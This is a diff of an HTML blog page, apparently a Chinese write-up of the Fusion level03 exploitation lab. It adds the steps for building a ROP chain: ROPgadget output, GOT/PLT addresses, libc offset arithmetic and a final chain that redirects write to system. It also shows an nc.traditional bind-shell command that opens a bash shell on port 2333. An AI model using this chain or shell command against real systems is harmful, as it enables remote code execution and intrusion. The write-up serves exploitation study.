@@ -857,7 +857,7 @@ if (!doNotTrack) {
 <p>（python 的 pwntools 里就有这个方法 <code>pwnlib.util.cyclic</code></p>
 <p>（但是我想用 ruby x</p>
 <hr>
-<h2 id="return-oriented-programming">Return-oriented Programming</h2>
+<h2 id="find-out-rop-chain">Find Out ROP chain</h2>
 <p>首先我们遇到的限制是：</p>
 <ul>
 <li>
@@ -885,6 +885,171 @@ if (!doNotTrack) {
 → <code>system(&quot;/bin/nc.traditional -lvnp 2333 -e /bin/bash&quot;);</code><br>
 → 注意得用 nc.traditional 否则是 netcat-openbsd，没有 -e 选项</li>
 </ul>
+<p>然后按照前面说过的，我们的目的是执行 ret2libc 执行 system 函数</p>
+<p>但是由于程序里并没有用过 system，所以动态链接表里是没这个的地址的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fusion@fusion:~$ objdump -t /opt/fusion/bin/level03 <span class="p">|</span> grep system
+</span></span><span class="line"><span class="cl"><span class="c1"># 什么都没有</span>
+</span></span></code></pre></div><p>虽然有 ASLR，但是 libc 内部各种函数之间的偏移量是固定的</p>
+<p>所以我们只能找另外一个可怜的 libc 函数（必须得是动态链接表里有记录的）&hellip;然后算出偏移来，然后覆盖动态链接表</p>
+<p>总之先考虑 ropchain 再考虑用哪个函数吧x</p>
+<p>首先需要对 <strong>「某个地址上的值进行加/减操作」</strong> 的 ropchain</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ROPgadget --binary level03 --ropchain <span class="p">|</span> grep <span class="s2">&#34;add dword ptr&#34;</span>
+</span></span><span class="line"><span class="cl">0x080493fc : add al, <span class="m">8</span> <span class="p">;</span> add dword ptr <span class="o">[</span>ebx + 0x5d5b04c4<span class="o">]</span>, eax <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x08049c93 : add dword ptr <span class="o">[</span>ebx + 0x548b02c3<span class="o">]</span>, eax <span class="p">;</span> and al, 0x1c <span class="p">;</span> jmp 0x8049bfe
+</span></span><span class="line"><span class="cl">0x080493fe : add dword ptr <span class="o">[</span>ebx + 0x5d5b04c4<span class="o">]</span>, eax <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0804ab3e : add dword ptr <span class="o">[</span>edx<span class="o">]</span>, ecx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0804ab37 : add eax, 0x3870486 <span class="p">;</span> add ebx, ebp <span class="p">;</span> add dword ptr <span class="o">[</span>edx<span class="o">]</span>, ecx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0804ab3c : add ebx, ebp <span class="p">;</span> add dword ptr <span class="o">[</span>edx<span class="o">]</span>, ecx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x08048dc7 : fadd dword ptr <span class="o">[</span>eax<span class="o">]</span> <span class="p">;</span> add byte ptr <span class="o">[</span>eax<span class="o">]</span>, al <span class="p">;</span> jmp 0x8048c00
+</span></span><span class="line"><span class="cl">0x08049c92 : inc ebx <span class="p">;</span> add dword ptr <span class="o">[</span>ebx + 0x548b02c3<span class="o">]</span>, eax <span class="p">;</span> and al, 0x1c <span class="p">;</span> jmp 0x8049bfe
+</span></span><span class="line"><span class="cl">0x0804ab3a : xchg dword ptr <span class="o">[</span>ebx<span class="o">]</span>, eax <span class="p">;</span> add ebx, ebp <span class="p">;</span> add dword ptr <span class="o">[</span>edx<span class="o">]</span>, ecx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 这个好像挺不错：</span>
+</span></span><span class="line"><span class="cl">0x080493fe : add dword ptr <span class="o">[</span>ebx + 0x5d5b04c4<span class="o">]</span>, eax <span class="p">;</span> ret
+</span></span></code></pre></div><p>那么，就需要：</p>
+<ul>
+<li>让 ebx + 0x5d5b04c4 是 <em>某个可怜函数 funcA</em> 的地址</li>
+<li>让 eax 是 <em>某个可怜函数 funcA</em> 到 libc_system 之间的偏移量</li>
+</ul>
+<p>所以需要 pop ebx 和 pop eax 操作：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="no">ROPgadget</span> <span class="o">--</span><span class="n">binary</span> <span class="n">level03</span> <span class="o">--</span><span class="n">ropchain</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">&#34;pop ebx ; ret&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08048beb</span> <span class="p">:</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span><span class="p">,</span> <span class="n">al</span> <span class="p">;</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08049a4c</span> <span class="p">:</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x18</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08048bed</span> <span class="p">:</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08049a4d</span> <span class="p">:</span> <span class="n">les</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08048bee</span> <span class="p">:</span> <span class="n">les</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08048be9</span> <span class="p">:</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="mh">0x83000016</span><span class="o">]</span><span class="p">,</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">les</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08048bf0</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08048bea</span> <span class="p">:</span> <span class="n">push</span> <span class="n">ss</span> <span class="p">;</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span><span class="p">,</span> <span class="n">al</span> <span class="p">;</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 直接就有，好诶</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08048bf0</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="no">ROPgadget</span> <span class="o">--</span><span class="n">binary</span> <span class="n">level03</span> <span class="o">--</span><span class="n">ropchain</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">&#34;pop eax ; ret&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 什么都没有...只能绕路了</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="no">ROPgadget</span> <span class="o">--</span><span class="n">binary</span> <span class="n">level03</span> <span class="o">--</span><span class="n">ropchain</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">&#34;pop eax&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x0804a942</span> <span class="p">:</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span><span class="p">,</span> <span class="n">al</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span><span class="p">,</span> <span class="n">al</span> <span class="p">;</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span><span class="p">,</span> <span class="n">bl</span> <span class="p">;</span> <span class="n">jmp</span> <span class="mh">0x804a94a</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x0804a944</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span><span class="p">,</span> <span class="n">al</span> <span class="p">;</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span><span class="p">,</span> <span class="n">bl</span> <span class="p">;</span> <span class="n">jmp</span> <span class="mh">0x804a94a</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08049b4f</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x5c</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x0804a940</span> <span class="p">:</span> <span class="n">xor</span> <span class="n">al</span><span class="p">,</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span><span class="p">,</span> <span class="n">al</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span><span class="p">,</span> <span class="n">al</span> <span class="p">;</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span><span class="p">,</span> <span class="n">bl</span> <span class="p">;</span> <span class="n">jmp</span> <span class="mh">0x804a94a</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 只有这个比较顺眼...</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x08049b4f</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x5c</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span></code></pre></div><p>最后我们得到了这三个东西：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="mi">1</span><span class="o">.</span> <span class="mh">0x08048bf0</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span> <span class="c1"># 把 2. 的值写进 ebx</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">.</span> <span class="c1"># 在这里放上「funcA 的地址 - 0x5d5b04c4」（减去这个数字是因为 6. 的 ebx 大了 0x5d5b04c4</span>
+</span></span><span class="line"><span class="cl"><span class="mi">3</span><span class="o">.</span> <span class="mh">0x08049b4f</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x5c</span> <span class="p">;</span> <span class="n">ret</span> <span class="c1"># 把 4. 的值写进 eax</span>
+</span></span><span class="line"><span class="cl"><span class="mi">4</span><span class="o">.</span> <span class="c1"># 在这里放上「funcA 的地址 到 libc_system 地址」之间的偏移量</span>
+</span></span><span class="line"><span class="cl"><span class="mi">5</span><span class="o">.</span> <span class="c1"># 这里得写上 0x5c 个字符，因为 3. 出现了 add esp, 0x5c</span>
+</span></span><span class="line"><span class="cl"><span class="mi">6</span><span class="o">.</span> <span class="mh">0x080493fe</span> <span class="p">:</span> <span class="n">add</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebx</span> <span class="o">+</span> <span class="mh">0x5d5b04c4</span><span class="o">]</span><span class="p">,</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">ret</span> <span class="c1"># 成功改写了 funcA 的 plt</span>
+</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="o">.</span> <span class="c1"># 在这里写 funcA 的 plt 地址，就会跳到 system</span>
+</span></span><span class="line"><span class="cl"><span class="mi">8</span><span class="o">.</span> <span class="c1"># 这里应该是 system 结束之后的返回地址，可以不用管</span>
+</span></span><span class="line"><span class="cl"><span class="mi">9</span><span class="o">.</span> <span class="c1"># 这里放上 system 的参数，当然就是 &#34;nc.traditional.....&#34; 的字符串的位置</span>
+</span></span></code></pre></div><hr>
+<h2 id="create-rop-chain">Create ROP Chain</h2>
+<p>胜利的公式已经写好了（不是</p>
+<p>接下来找个可怜的 libc 函数吧</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">fusion</span><span class="vi">@fusion</span><span class="ss">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">R</span> <span class="sr">/opt/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="sr">/opt/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="ss">level03</span><span class="p">:</span>     <span class="n">file</span> <span class="nb">format</span> <span class="n">elf32</span><span class="o">-</span><span class="n">i386</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="no">DYNAMIC</span> <span class="no">RELOCATION</span> <span class="no">RECORDS</span>
+</span></span><span class="line"><span class="cl"><span class="no">OFFSET</span>   <span class="no">TYPE</span>              <span class="no">VALUE</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bcc0</span> <span class="no">R_386_GLOB_DAT</span>    <span class="n">__gmon_start__</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bdc0</span> <span class="no">R_386_COPY</span>        <span class="n">stderr</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bdc4</span> <span class="no">R_386_COPY</span>        <span class="n">stdin</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bde0</span> <span class="no">R_386_COPY</span>        <span class="n">stdout</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bcd0</span> <span class="no">R_386_JUMP_SLOT</span>   <span class="n">__errno_location</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bcd4</span> <span class="no">R_386_JUMP_SLOT</span>   <span class="nb">srand</span>
+</span></span><span class="line"><span class="cl"><span class="o">.....</span>
+</span></span></code></pre></div><p>就决定是你了 srand！</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="nb">system</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$5</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7404b20</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="nb">srand</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$6</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb73fafc0</span> <span class="o">&lt;</span><span class="n">__srandom</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p><code>0xb7404b20 &lt;__libc_system&gt; - 0xb73fafc0 &lt;__srandom&gt; = 0x9B60</code></p>
+<p>啊 不行，这个偏移的值太小了，那字符串到了 <code>0x00009B60</code> 时会因为 null byte 被提前截断的</p>
+<p>那就随便换一个（</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="nb">system</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$5</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7404b20</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="nb">srand</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$6</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb73fafc0</span> <span class="o">&lt;</span><span class="n">__srandom</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="n">write</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$8</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb74892c0</span> <span class="o">&lt;</span><span class="n">write</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>这下 write 比 system 反而还大了！</p>
+<p>所以就可以偏移量就可以写一个负数，这个负数肯定是没有 null byte 的</p>
+<p><code>0xb74892c0 &lt;write&gt; - 0xb7404b20 &lt;__libc_system&gt; = 0x847A0</code></p>
+<p><code>0x0 - 0x847A0 = 0xFFF7B860</code></p>
+<hr>
+<p>注意！</p>
+<p>上面几个都是已经链接了之后，再用 gdb 看的地址&hellip;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">fusion</span><span class="vi">@fusion</span><span class="ss">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">R</span> <span class="sr">/opt/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">write</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bd1c</span> <span class="no">R_386_JUMP_SLOT</span>   <span class="n">write</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="n">write</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$8</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb74892c0</span> <span class="o">&lt;</span><span class="n">write</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0x08048d40</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x8048d40</span> <span class="o">&lt;</span><span class="n">write</span><span class="vi">@plt</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">jmp</span>    <span class="o">*</span><span class="mh">0x804bd1c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x0804bd1c</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x804bd1c</span> <span class="o">&lt;</span><span class="n">write</span><span class="vi">@got</span><span class="o">.</span><span class="n">plt</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0xb74892c0</span>
+</span></span></code></pre></div><blockquote>
+<p><strong>got</strong></p>
+<p>This is the GOT, or Global Offset Table. This is the actual table of offsets as filled in by the linker for external symbols.</p>
+<p><strong>.plt</strong></p>
+<p>This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the <code>.got.plt</code> section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to <code>.got.plt</code> yet.)</p>
+<p><strong>.got.plt</strong></p>
+<p>This is the GOT for the PLT. It contains the target addresses (after they have been looked up) or an address back in the <code>.plt</code> to trigger the lookup. Classically, this data was part of the <code>.got</code>section.</p>
+</blockquote>
+<p>以及，&ldquo;nc.traditional&hellip;&rdquo; 写在 gContents 里，其地址为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">fusion</span><span class="vi">@fusion</span><span class="ss">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">t</span> <span class="sr">/opt/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">gContents</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bdec</span> <span class="n">g</span>     <span class="n">O</span> <span class="o">.</span><span class="n">bss</span>	<span class="mo">00000004</span>              <span class="n">gContents_len</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bdf4</span> <span class="n">g</span>     <span class="n">O</span> <span class="o">.</span><span class="n">bss</span>	<span class="mo">00000004</span>              <span class="n">gContents</span>
+</span></span></code></pre></div><p>最终套回我们的公式：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="mi">1</span><span class="o">.</span> <span class="mh">0x08048bf0</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span> <span class="c1"># 把 2. 的值写进 ebx</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">.</span> <span class="mh">0xAAA9B858</span> <span class="c1"># 在这里放上「write 的地址 0x0804bd1c - 0x5d5b04c4」（减去这个数字是因为 6. 的 ebx 大了 0x5d5b04c4</span>
+</span></span><span class="line"><span class="cl"><span class="mi">3</span><span class="o">.</span> <span class="mh">0x08049b4f</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x5c</span> <span class="p">;</span> <span class="n">ret</span> <span class="c1"># 把 4. 的值写进 eax</span>
+</span></span><span class="line"><span class="cl"><span class="mi">4</span><span class="o">.</span> <span class="mh">0xFFF7B860</span> <span class="c1"># 在这里放上「write 的地址 到 libc_system 地址」之间的偏移量</span>
+</span></span><span class="line"><span class="cl"><span class="mi">5</span><span class="o">.</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mh">0x5C</span> <span class="c1"># 这里得写上 0x5c 个字符，因为 3. 出现了 add esp, 0x5c</span>
+</span></span><span class="line"><span class="cl"><span class="mi">6</span><span class="o">.</span> <span class="mh">0x080493fe</span> <span class="p">:</span> <span class="n">add</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebx</span> <span class="o">+</span> <span class="mh">0x5d5b04c4</span><span class="o">]</span><span class="p">,</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">ret</span> <span class="c1"># 成功改写了 funcA 的 plt</span>
+</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="o">.</span> <span class="mh">0x08048d40</span> <span class="c1"># 在这里写 write@plt 地址，就会跳到 system</span>
+</span></span><span class="line"><span class="cl"><span class="mi">8</span><span class="o">.</span> <span class="mh">0x23333333</span> <span class="c1"># 这里应该是 system 结束之后的返回地址，可以不用管</span>
+</span></span><span class="line"><span class="cl"><span class="mi">9</span><span class="o">.</span> <span class="mh">0x0804bdf4</span> <span class="c1"># 这里是 gContents 的地址，作为 system 的参数 &#34;nc.traditional.....&#34;</span>
+</span></span></code></pre></div><p>首先看看 libc 库的版本吧</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@fusion:/proc# pidof level03
+</span></span><span class="line"><span class="cl"><span class="m">1563</span> <span class="m">1410</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@fusion:/proc# cat 1410/maps
+</span></span><span class="line"><span class="cl">08048000-0804b000 r-xp <span class="m">00000000</span> 07:00 <span class="m">75279</span>      /opt/fusion/bin/level03
+</span></span><span class="line"><span class="cl">0804b000-0804c000 rw-p <span class="m">00002000</span> 07:00 <span class="m">75279</span>      /opt/fusion/bin/level03
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">b73c8000-b753e000 r-xp <span class="m">00000000</span> 07:00 <span class="m">92669</span>      /lib/i386-linux-gnu/libc-2.13.so
+</span></span><span class="line"><span class="cl">b753e000-b7540000 r--p <span class="m">00176000</span> 07:00 <span class="m">92669</span>      /lib/i386-linux-gnu/libc-2.13.so
+</span></span><span class="line"><span class="cl">b7540000-b7541000 rw-p <span class="m">00178000</span> 07:00 <span class="m">92669</span>      /lib/i386-linux-gnu/libc-2.13.so
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">fusion@fusion:~$ objdump -d /lib/i386-linux-gnu/libc.so.6 <span class="p">|</span> grep <span class="s2">&#34;system&#34;</span>
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">0003cb20 &lt;__libc_system&gt;:
+</span></span><span class="line"><span class="cl">   3cb40:	<span class="m">74</span> <span class="m">26</span>                	je     3cb68 &lt;__libc_system+0x48&gt;
+</span></span><span class="line"><span class="cl">   3cb4a:	<span class="m">75</span> <span class="m">40</span>                	jne    3cb8c &lt;__libc_system+0x6c&gt;
+</span></span><span class="line"><span class="cl">   3cba9:	eb cf                	jmp    3cb7a &lt;__libc_system+0x5a&gt;
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">fusion@fusion:~$ objdump -d /lib/i386-linux-gnu/libc.so.6 <span class="p">|</span> grep <span class="s2">&#34;write&#34;</span>
+</span></span><span class="line"><span class="cl">.......
+</span></span><span class="line"><span class="cl">000c12c0 &lt;__write&gt;:
+</span></span><span class="line"><span class="cl">   c12c8:	<span class="m">75</span> <span class="m">22</span>                	jne    c12ec &lt;__write+0x2c&gt;
+</span></span><span class="line"><span class="cl">   c12e9:	<span class="m">73</span> <span class="m">32</span>                	jae    c131d &lt;__write+0x5d&gt;
+</span></span><span class="line"><span class="cl">   c131a:	<span class="m">73</span> <span class="m">01</span>                	jae    c131d &lt;__write+0x5d&gt;
+</span></span><span class="line"><span class="cl">   c133e:	eb dc                	jmp    c131c &lt;__write+0x5c&gt;
+</span></span><span class="line"><span class="cl">   c395b:	e8 <span class="m">40</span> 3d fe ff       	call   a76a0 &lt;__libc_pwrite&gt;
+</span></span><span class="line"><span class="cl">   c3c4f:	e8 2c 3c fe ff       	call   a7880 &lt;__pwrite64&gt;
+</span></span><span class="line"><span class="cl">   c9ca0:	e8 1b <span class="m">76</span> ff ff       	call   c12c0 &lt;__write&gt;
+</span></span><span class="line"><span class="cl">......
+</span></span></code></pre></div><p>所以两者之前的偏移是</p>
+<p><code>000c12c0 - 0003cb20 = 0x847A0</code></p>
 <p><em>&mdash;&mdash;&ndash;draft&mdash;&mdash;&ndash;</em></p>
 <p>需要 system 来执行上面那句话</p>
 <p>但是这个程序中没有用过 system，且开了 aslr</p>
@@ -1252,7 +1417,8 @@ if (!doNotTrack) {
     <li><a href="#overview">Overview</a></li>
     <li><a href="#vulnerability">Vulnerability</a></li>
     <li><a href="#interact-with-program">Interact with Program</a></li>
-    <li><a href="#return-oriented-programming">Return-oriented Programming</a></li>
+    <li><a href="#find-out-rop-chain">Find Out ROP chain</a></li>
+    <li><a href="#create-rop-chain">Create ROP Chain</a></li>
   </ol>
 </nav>
         </div>
